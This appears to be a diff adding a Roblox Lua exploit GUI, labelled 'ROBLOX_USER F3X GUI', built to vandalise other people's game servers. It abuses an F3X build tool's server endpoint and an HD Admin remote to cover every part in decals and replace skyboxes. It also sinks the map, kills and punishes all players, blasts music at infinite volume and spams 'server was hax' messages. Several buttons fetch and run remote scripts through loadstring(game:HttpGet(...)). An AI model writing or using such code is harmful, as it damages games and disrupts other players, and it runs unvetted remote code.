@@ -1,0 +1,309 @@
+-- ROBLOX_USER F3X GUI
+local P,U,R,S=game:GetService("Players"),game:GetService("UserInputService"),game:GetService("RunService"),game:GetService("ReplicatedStorage")
+local LP=P.LocalPlayer
+local pg=LP:WaitForChild("PlayerGui")
+local tG=Instance.new("ScreenGui",pg) tG.Name="CT" tG.ResetOnSpawn=false
+local tB=Instance.new("ImageButton",tG)
+tB.Size,tB.Position,tB.BackgroundTransparency,tB.Image=UDim2.new(0,50,0,50),UDim2.new(0,8,1,-65),1,"rbxassetid://126743943740530"
+local a=0 R.RenderStepped:Connect(function(d)a+=d*45 tB.Rotation=a end)
+local g=Instance.new("ScreenGui",pg) g.Name="CG" g.ResetOnSpawn=false g.Enabled=false
+local m=Instance.new("Frame",g)
+m.Size,m.Position,m.BackgroundColor3,m.BorderSizePixel=UDim2.new(0,340,0,260),UDim2.new(.5,-170,.5,-130),Color3.fromRGB(0,0,255),0
+local ti=Instance.new("TextLabel",m)
+ti.Size,ti.BackgroundColor3,ti.Text,ti.TextColor3,ti.TextScaled=UDim2.new(1,0,0,26),Color3.fromRGB(0,0,180),"ROBLOX_USER F3X",Color3.new(),true
+local c=Instance.new("Frame",m)
+c.Size,c.Position,c.BackgroundColor3,c.BorderSizePixel=UDim2.new(1,-4,1,-58),UDim2.new(0,2,0,28),Color3.fromRGB(0,0,220),0
+local pages={}
+local function page(n,v) local p=Instance.new("Frame",c) p.Size,p.BackgroundTransparency,p.Visible=UDim2.new(1,0,1,0),1,v or false pages[n]=p return p end
+local function B(par,txt,sz,pos,col,cb)
+	local b=Instance.new("TextButton",par)
+	b.Size,b.Position,b.BackgroundColor3,b.Text,b.TextColor3,b.TextScaled=sz,pos,col,txt,Color3.new(),true
+	b.MouseButton1Click:Connect(function()pcall(cb)end) return b
+end
+local function hd(cmd)pcall(function()local x=S:FindFirstChild("HDAdminHDClient")if x and x.Signals then local r=x.Signals:FindFirstChild("RequestCommandSilent")if r then r:InvokeServer(cmd)end end end)end
+local function getF3X()
+	for _,v in pairs(LP:GetDescendants())do if v.Name=="SyncAPI"then return v.Parent end end
+	for _,v in pairs(game:GetDescendants())do if v.Name=="SyncAPI"then return v.Parent end end
+end
+local function F3X()
+	local t=getF3X()if not t then return end
+	local r=t.SyncAPI.ServerEndpoint
+	local function _(a)r:InvokeServer(unpack(a))end
+	local f={}
+	f.CP=function(cf,p)_({[1]="CreatePart",[2]="Normal",[3]=cf,[4]=p or workspace})end
+	f.SN=function(p,n)_({[1]="SetName",[2]={[1]=p},[3]=n})end
+	f.AM=function(p)_({[1]="CreateMeshes",[2]={{["Part"]=p}}})end
+	f.SM=function(p,id)_({[1]="SyncMesh",[2]={{["Part"]=p,["MeshId"]="rbxassetid://"..id}}})end
+	f.ST=function(p,id)_({[1]="SyncMesh",[2]={{["Part"]=p,["TextureId"]="rbxassetid://"..id}}})end
+	f.MR=function(p,s)_({[1]="SyncMesh",[2]={{["Part"]=p,["Scale"]=s}}})end
+	f.SL=function(p,b)_({[1]="SetLocked",[2]={[1]=p},[3]=b})end
+	f.SA=function(b,p)_({[1]="SyncAnchor",[2]={{["Part"]=p,["Anchored"]=b}}})end
+	f.SD=function(p,s)_({[1]="CreateTextures",[2]={{["Part"]=p,["Face"]=s,["TextureType"]="Decal"}}})end
+	f.AD=function(p,id,s)_({[1]="SyncTexture",[2]={{["Part"]=p,["Face"]=s,["TextureType"]="Decal",["Texture"]=id==""and""or("rbxassetid://"..id)}}})end
+	f.RS=function(p,s,cf)_({[1]="SyncResize",[2]={{["Part"]=p,["CFrame"]=cf,["Size"]=s}}})end
+	f.MV=function(p,cf)_({[1]="SyncMove",[2]={{["Part"]=p,["CFrame"]=cf}}})end
+	f.SC=function(p,b)_({[1]="SyncCollision",[2]={{["Part"]=p,["CanCollide"]=b}}})end
+	f.TR=function(p,i)_({[1]="SyncMaterial",[2]={{["Part"]=p,["Transparency"]=i}}})end
+	f.CL=function(p,c)_({[1]="SyncColor",[2]={{["Part"]=p,["Color"]=c,["UnionColoring"]=false}}})end
+	f.RM=function(p)_({[1]="Remove",[2]={[1]=p}})end
+	f.Sky=function(id)
+		for _,v in pairs(workspace:GetChildren())do if v:IsA("BasePart")and(v.Name=="Sky"or v.Name:lower():find("sky"))then pcall(function()f.RM(v)end)end end
+		task.wait(.12)local ch=LP.Character if not ch then return end
+		local pos=ch.HumanoidRootPart.CFrame+Vector3.new(0,6,0)f.CP(pos)task.wait(.12)
+		for _,v in pairs(workspace:GetChildren())do
+			if v:IsA("BasePart")and(v.Position-pos.Position).Magnitude<1.5 then
+				f.SN(v,"Sky")f.AM(v)f.SM(v,"111891702759441")f.ST(v,id)f.MR(v,Vector3.new(1000,1000,1000))f.SL(v,true)f.SA(true,v)break
+			end
+		end
+	end
+	f.spam=function(id)
+		for _,v in pairs(workspace:GetDescendants())do if v:IsA("BasePart")then task.spawn(function()pcall(function()
+			f.SL(v,false)
+			for _,s in pairs({Enum.NormalId.Front,Enum.NormalId.Back,Enum.NormalId.Left,Enum.NormalId.Right,Enum.NormalId.Top,Enum.NormalId.Bottom})do f.SD(v,s)f.AD(v,id,s)end
+		end)end)end end
+	end
+	return f
+end
+
+local ids={"126743943740530","95767058723166","127729838362726","83676516977681","119950371481002"}
+local dp=page("decal",true)
+local dpv=Instance.new("ImageLabel",dp)
+dpv.Size,dpv.Position,dpv.BackgroundColor3,dpv.BorderSizePixel=UDim2.new(0,100,0,100),UDim2.new(0,4,.5,-50),Color3.fromRGB(0,0,150),2
+local dtx=Instance.new("TextLabel",dpv)dtx.Size,dtx.BackgroundTransparency,dtx.Text,dtx.TextColor3,dtx.TextScaled=UDim2.new(1,0,1,0),1,"decal",Color3.new(),true
+local db=Instance.new("Frame",dp)db.Size,db.Position,db.BackgroundTransparency=UDim2.new(0,160,0,170),UDim2.new(1,-165,.5,-85),1
+for i,id in ipairs(ids)do
+	B(db,"d"..i,UDim2.new(1,0,0,22),UDim2.new(0,0,0,(i-1)*24),Color3.fromRGB(0,0,180),function()_G.SelD=id dpv.Image="rbxassetid://"..id dtx.Visible=false end)
+end
+B(db,"EXEC",UDim2.new(1,0,0,24),UDim2.new(0,0,1,-52),Color3.fromRGB(0,200,0),function()if _G.SelD then local f=F3X()if f then f.spam(_G.SelD)end end end)
+B(db,"del",UDim2.new(1,0,0,22),UDim2.new(0,0,1,-26),Color3.fromRGB(180,0,0),function()
+	local f=F3X()if not f then return end
+	for _,v in pairs(workspace:GetDescendants())do if v:IsA("BasePart")then task.spawn(function()pcall(function()
+		f.SL(v,false)for _,face in pairs({Enum.NormalId.Front,Enum.NormalId.Back,Enum.NormalId.Left,Enum.NormalId.Right,Enum.NormalId.Top,Enum.NormalId.Bottom})do f.AD(v,"",face)end
+	end)end)end end
+end)
+
+local sp=page("skybox")
+local spv=Instance.new("ImageLabel",sp)
+spv.Size,spv.Position,spv.BackgroundColor3,spv.BorderSizePixel=UDim2.new(0,100,0,100),UDim2.new(0,4,.5,-50),Color3.fromRGB(0,0,150),2
+local stx=Instance.new("TextLabel",spv)stx.Size,stx.BackgroundTransparency,stx.Text,stx.TextColor3,stx.TextScaled=UDim2.new(1,0,1,0),1,"sky",Color3.new(),true
+local sb=Instance.new("Frame",sp)sb.Size,sb.Position,sb.BackgroundTransparency=UDim2.new(0,160,0,170),UDim2.new(1,-165,.5,-85),1
+for i,id in ipairs(ids)do
+	B(sb,"s"..i,UDim2.new(1,0,0,22),UDim2.new(0,0,0,(i-1)*24),Color3.fromRGB(0,0,180),function()_G.SelS=id spv.Image="rbxassetid://"..id stx.Visible=false end)
+end
+B(sb,"EXEC",UDim2.new(1,0,0,24),UDim2.new(0,0,1,-52),Color3.fromRGB(0,200,0),function()if _G.SelS then local f=F3X()if f then f.Sky(_G.SelS)end end end)
+B(sb,"del",UDim2.new(1,0,0,22),UDim2.new(0,0,1,-26),Color3.fromRGB(180,0,0),function()
+	local f=F3X()if not f then return end
+	for _,v in pairs(workspace:GetChildren())do if v:IsA("BasePart")and(v.Name=="Sky"or v.Name:lower():find("sky"))then pcall(function()f.RM(v)end)end end
+end)
+
+local sc=Instance.new("ScrollingFrame",c)
+sc.Size,sc.BackgroundTransparency,sc.ScrollBarThickness,sc.CanvasSize,sc.Visible=UDim2.new(1,0,1,0),1,3,UDim2.new(0,0,0,720),false
+pages.scripts=sc
+local function btn(n,y,cb)B(sc,n,UDim2.new(.47,0,0,24),UDim2.new(y%2==0 and.01 or.52,0,0,math.floor(y/2)*26),Color3.fromRGB(0,0,180),cb)end
+local mp=page("maps")
+
+local function spin()
+	local f=F3X()if not f then return end
+	local chars={}for _,plr in pairs(P:GetPlayers())do if plr.Character then chars[plr.Character]=true end end
+	local rot=CFrame.Angles(math.rad(15),0,0)local n=0
+	for _,v in pairs(workspace:GetDescendants())do
+		if v:IsA("BasePart")and v.Parent then
+			local sk=false for ch in pairs(chars)do if v:IsDescendantOf(ch)then sk=true break end end
+			if sk then continue end
+			local nm=v.Name:lower()
+			if nm:find("head")or nm:find("torso")or nm:find("arm")or nm:find("leg")or nm=="humanoidrootpart"then continue end
+			n+=1 task.spawn(function()pcall(function()f.SL(v,false)task.wait(.02)f.MV(v,v.CFrame*rot)end)end)
+			if n%25==0 then task.wait(.04)end
+		end
+	end
+end
+local function do666()
+	for _,p in pairs(workspace:GetDescendants())do if p:IsA("BasePart")then
+		local o=p:FindFirstChild("CH")if o then o:Destroy()end
+		local h=Instance.new("Highlight")h.Name="CH"h.FillColor=Color3.fromRGB(255,0,0)h.OutlineColor=Color3.fromRGB(255,0,0)h.FillTransparency=.7 h.Parent=p
+	end end hd(";fire all")
+end
+local function textAll()
+	local faces={Enum.NormalId.Front,Enum.NormalId.Back,Enum.NormalId.Left,Enum.NormalId.Right,Enum.NormalId.Top,Enum.NormalId.Bottom}
+	for _,p in pairs(workspace:GetDescendants())do if p:IsA("BasePart")then pcall(function()
+		for _,face in pairs(faces)do
+			local name="CT_"..tostring(face)local old=p:FindFirstChild(name)if old then old:Destroy()end
+			local sg=Instance.new("SurfaceGui")sg.Name=name sg.Face=face sg.AlwaysOnTop=true sg.Parent=p
+			local tl=Instance.new("TextLabel",sg)tl.Size=UDim2.new(1,0,1,0)tl.BackgroundTransparency=1 tl.Text="roblox_user!"
+			tl.TextColor3=Color3.fromRGB(255,0,0)tl.TextScaled=true tl.Font=Enum.Font.GothamBold tl.TextStrokeTransparency=0
+		end
+	end)end end
+end
+local darkOn=false
+local function darkMango()
+	if darkOn then return end darkOn=true
+	hd(";music 76578817848504")hd(";pitch 1")hd(";volume inf")
+	local f=F3X()if f then pcall(function()f.Sky("119950371481002")end)end
+	for _,p in pairs(workspace:GetDescendants())do if p:IsA("BasePart")then pcall(function()
+		local o=p:FindFirstChild("DarkT")if o then o:Destroy()end
+		local pe=Instance.new("ParticleEmitter")pe.Name="DarkT"pe.Texture="rbxassetid://126743943740530"
+		pe.Rate=400 pe.Lifetime=NumberRange.new(2,4)pe.Speed=NumberRange.new(5,18)
+		pe.Size=NumberSequence.new({NumberSequenceKeypoint.new(0,4),NumberSequenceKeypoint.new(1,2)})
+		pe.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0,0),NumberSequenceKeypoint.new(1,0)})
+		pe.LightEmission=1 pe.SpreadAngle=Vector2.new(180,180)pe.Parent=p
+	end)end end
+	task.spawn(function()while darkOn do hd(";sm dark mango cartola_user psychology")task.wait(1.5)end end)
+	task.spawn(function()
+		local step=1
+		while darkOn do
+			if step==1 then
+				task.spawn(function()
+					for i=1,20 do
+						if not darkOn then break end
+						local part=Instance.new("Part")part.Name="Tung"part.Size=Vector3.new(2,2,2)
+						part.Position=Vector3.new(math.random(-50,50),55,math.random(-50,50))
+						part.Anchored=false part.CanCollide=true part.Parent=workspace
+						local mesh=Instance.new("SpecialMesh",part)
+						mesh.MeshType=Enum.MeshType.FileMesh mesh.MeshId="rbxassetid://138151705692565"mesh.Scale=Vector3.new(4,4,4)
+						task.delay(8,function()if part then part:Destroy()end end)task.wait(.1)
+					end
+				end)
+			elseif step==2 then do666()
+			elseif step==3 then local ff=F3X()if ff then pcall(function()ff.spam("126743943740530")end)end
+			else spin()end
+			step=step%4+1 task.wait(30)
+		end
+	end)
+end
+local skyOn=false
+local function realm()
+	local f=F3X()if not f then return end
+	local function find(pos)task.wait(.12)for _,v in pairs(workspace:GetChildren())do if v:IsA("BasePart")and(v.Position-pos).Magnitude<5 then return v end end end
+	hd(";punish all")task.wait(.12)hd(";sm welcome to The realm of roblox_user!")
+	for _,v in pairs(workspace:GetDescendants())do
+		if v:IsA("BasePart")and(v.Size.X>=15 or v.Size.Z>=15 or v.Name:lower():find("base"))then
+			pcall(function()f.MV(v,CFrame.new(0,-800,0))f.SA(true,v)end)
+		end
+	end
+	task.wait(.25)f.CP(CFrame.new(0,5,0))local base=find(Vector3.new(0,5,0))
+	if base then f.SN(base,"Baseplate")f.RS(base,Vector3.new(300,1,300),CFrame.new())f.CL(base,Color3.fromRGB(0,180,0))f.SA(true,base)end
+	for i,cf in ipairs({CFrame.new(0,1.2,0),CFrame.new(10,1.2,0),CFrame.new(-10,1.2,0)})do
+		f.CP(cf)local p=find(cf.Position)
+		if p then f.SN(p,"Spawn"..i)f.RS(p,Vector3.new(6,1,6),cf)f.TR(p,1)f.SA(true,p)f.SD(p,Enum.NormalId.Top)f.AD(p,"126743943740530",Enum.NormalId.Top)end
+	end
+	local function txt(cf,t,n)
+		f.CP(cf)local p=find(cf.Position)
+		if p then f.SN(p,n)f.RS(p,Vector3.new(18,8,.6),cf)f.TR(p,1)f.SC(p,false)f.SA(true,p)
+			local sg=Instance.new("SurfaceGui",p)sg.Face=Enum.NormalId.Front sg.AlwaysOnTop=true
+			local tl=Instance.new("TextLabel",sg)tl.Size=UDim2.new(1,0,1,0)tl.BackgroundTransparency=1
+			tl.Text=t tl.TextColor3=Color3.fromRGB(255,0,0)tl.TextScaled=true tl.Font=Enum.Font.GothamBold tl.TextStrokeTransparency=0
+		end
+	end
+	txt(CFrame.new(9,6,-14)*CFrame.Angles(0,math.rad(180),0),"HELLO THIS SERVER WAS HAX BY ROBLOX_USER","T1")
+	txt(CFrame.new(-9,6,-14)*CFrame.Angles(0,math.rad(180),0),"LOLZ HAHAHAHAHAHA","T2")
+	local function wall(cf,n,id)
+		f.CP(cf)local p=find(cf.Position)
+		if p then f.SN(p,n)f.RS(p,Vector3.new(22,14,1.5),cf)f.CL(p,Color3.fromRGB(30,30,30))f.SA(true,p)
+			f.SD(p,Enum.NormalId.Front)f.AD(p,id,Enum.NormalId.Front)f.SD(p,Enum.NormalId.Back)f.AD(p,id,Enum.NormalId.Back)
+		end
+	end
+	wall(CFrame.new(28,7,0)*CFrame.Angles(0,math.rad(90),0),"W1","126743943740530")
+	wall(CFrame.new(-28,7,0)*CFrame.Angles(0,math.rad(-90),0),"W2","119950371481002")
+	task.wait(.15)hd(";unpunish all")task.wait(10)hd(";kill all")
+	if not skyOn then skyOn=true task.spawn(function()
+		local ids2={"119950371481002","127729838362726"}local i=1
+		while skyOn do local ff=F3X()if ff then
+			for _,v in pairs(workspace:GetChildren())do if v:IsA("BasePart")and(v.Name=="Sky"or v.Name:lower():find("sky"))then pcall(function()ff.RM(v)end)end end
+			task.wait(.2)pcall(function()ff.Sky(ids2[i])end)
+		end i=i%2+1 task.wait(3.5)end
+	end)end
+end
+local destOn=false
+local function destroyer()
+	if destOn then destOn=false return end destOn=true
+	hd(";music 16190761193")hd(";pitch 1")hd(";volume inf")do666()
+	local f=F3X()if f then pcall(function()f.spam("127729838362726")end)task.wait(.15)pcall(function()f.Sky("119950371481002")end)end
+	hd(";fire all")
+	for _,p in pairs(workspace:GetDescendants())do if p:IsA("BasePart")then pcall(function()
+		local o=p:FindFirstChild("CP")if o then o:Destroy()end
+		local sz=math.random(1,300)
+		local pe=Instance.new("ParticleEmitter")pe.Name="CP"pe.Texture="rbxassetid://126743943740530"
+		pe.Rate=70 pe.Lifetime=NumberRange.new(1.5,3)pe.Speed=NumberRange.new(2,12)
+		pe.Size=NumberSequence.new({NumberSequenceKeypoint.new(0,sz),NumberSequenceKeypoint.new(1,sz)})
+		pe.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0,0),NumberSequenceKeypoint.new(1,0)})
+		pe.LightEmission=.3 pe.Parent=p Instance.new("Fire",p).Size=math.random(10,22)
+	end)end end
+	pcall(spin)
+	task.spawn(function()while destOn do hd(";sm ROBLOX_USER WAS DESTROYED THIS GAME LOLZ")task.wait(3)end end)
+end
+
+btn("title all",0,function()hd(";title all roblox_user WAS here")end)
+btn("title",1,function()hd(";title roblox_user ROBLOX_USER")end)
+btn("fire all",2,function()hd(";fire all")end)
+btn("music",3,function()hd(";music 75817059227467")hd(";pitch 1")hd(";volume inf")end)
+btn("music 2",4,function()hd(";music 94635984925376")hd(";pitch 1")hd(";volume inf")end)
+btn("music 3",5,function()hd(";music 125827224741373")hd(";pitch 1")hd(";volume inf")end)
+btn("music 4",6,function()hd(";music 16190761193")hd(";pitch 1")hd(";volume inf")end)
+btn("music 5",7,function()hd(";music 76578817848504")hd(";pitch 1")hd(";volume inf")end)
+btn("bring all",8,function()hd(";bring all")end)
+btn("disco",9,function()hd(";disco")task.wait(.1)hd(";disco")end)
+btn("kill all",10,function()hd(";kill all")end)
+btn("unfire",11,function()hd(";unfire all")end)
+btn("hint",12,function()hd(";Sh this game haxoored by roblox_user")end)
+btn("message",13,function()hd(";Sm this game haxoored by roblox_user l0l")end)
+btn("goner",14,function()loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-GONER-F3X-Script-R6-210773"))()end)
+btn("Obama rain",15,function()loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-obama-rain-f3x-29924"))()end)
+btn("666",16,function()do666()end)
+btn("char all",17,function()hd(";char all roblox_user7133")end)
+btn("particles all",18,function()
+	hd(";fire all")
+	for _,p in pairs(workspace:GetDescendants())do if p:IsA("BasePart")then pcall(function()
+		local o=p:FindFirstChild("CP")if o then o:Destroy()end
+		local pe=Instance.new("ParticleEmitter")pe.Name="CP"pe.Texture="rbxassetid://126743943740530"
+		pe.Rate=90 pe.Lifetime=NumberRange.new(1.5,3)pe.Speed=NumberRange.new(3,10)
+		pe.Size=NumberSequence.new({NumberSequenceKeypoint.new(0,2),NumberSequenceKeypoint.new(1,1)})
+		pe.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0,0),NumberSequenceKeypoint.new(1,0)})
+		pe.LightEmission=.3 pe.Parent=p Instance.new("Fire",p).Size=18
+	end)end end
+end)
+btn("spin map",19,function()spin()end)
+btn("Destroyer",20,function()destroyer()end)
+btn("dark mango",21,function()darkMango()end)
+btn("text all",22,function()textAll()end)
+btn("particles",23,function()
+	for _,plr in pairs(P:GetPlayers())do
+		local char=plr.Character if not char then continue end
+		for _,part in pairs(char:GetDescendants())do if part:IsA("BasePart")then pcall(function()
+			local old=part:FindFirstChild("PP")if old then old:Destroy()end
+			local pe=Instance.new("ParticleEmitter")pe.Name="PP"pe.Texture="rbxassetid://126743943740530"
+			pe.Rate=80 pe.Lifetime=NumberRange.new(1.2,2.5)pe.Speed=NumberRange.new(2,8)
+			pe.Size=NumberSequence.new({NumberSequenceKeypoint.new(0,1.5),NumberSequenceKeypoint.new(1,0.8)})
+			pe.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0,0),NumberSequenceKeypoint.new(1,0.3)})
+			pe.LightEmission=.4 pe.SpreadAngle=Vector2.new(40,40)pe.Parent=part
+		end)end end
+	end
+end)
+
+B(mp,"kusty",UDim2.new(0,130,0,26),UDim2.new(0,6,0,6),Color3.fromRGB(0,0,180),function()loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Krusty-Krab-F3X-MAP-149096"))()end)
+B(mp,"idk",UDim2.new(0,130,0,26),UDim2.new(0,145,0,6),Color3.fromRGB(0,0,180),function()loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Tubers-Cave-F3X-MAP-204748"))()end)
+B(mp,"forever",UDim2.new(0,130,0,26),UDim2.new(0,6,0,36),Color3.fromRGB(0,0,180),function()loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Forever-Young-Daycare-F3X-Incident-map-239726"))()end)
+B(mp,"realm",UDim2.new(0,130,0,26),UDim2.new(0,145,0,36),Color3.fromRGB(0,0,180),function()realm()end)
+B(mp,"NDS",UDim2.new(0,130,0,26),UDim2.new(0,6,0,66),Color3.fromRGB(0,0,180),function()
+	loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-natural-disaster-survivals-F3X-MAP-135568"))()
+end)
+
+local tf=Instance.new("Frame",m)
+tf.Size,tf.Position,tf.BackgroundColor3,tf.BorderSizePixel=UDim2.new(1,0,0,26),UDim2.new(0,0,1,-26),Color3.fromRGB(0,0,180),0
+for i,n in ipairs({"decal","skybox","scripts","maps"})do
+	B(tf,n,UDim2.new(.25,-2,1,-4),UDim2.new((i-1)*.25,1,0,2),Color3.fromRGB(0,0,210),function()
+		for _,p in pairs(pages)do p.Visible=false end pages[n].Visible=true
+	end)
+end
+tB.MouseButton1Click:Connect(function()g.Enabled=not g.Enabled end)
+local drag,st,po
+m.InputBegan:Connect(function(i)
+	if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then
+		drag,st,po=true,i.Position,m.Position
+		i.Changed:Connect(function()if i.UserInputState==Enum.UserInputState.End then drag=false end end)
+	end
+end)
+U.InputChanged:Connect(function(i)
+	if drag and(i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch)then
+		local d=i.Position-st m.Position=UDim2.new(po.X.Scale,po.X.Offset+d.X,po.Y.Scale,po.Y.Offset+d.Y)
+	end
+end)
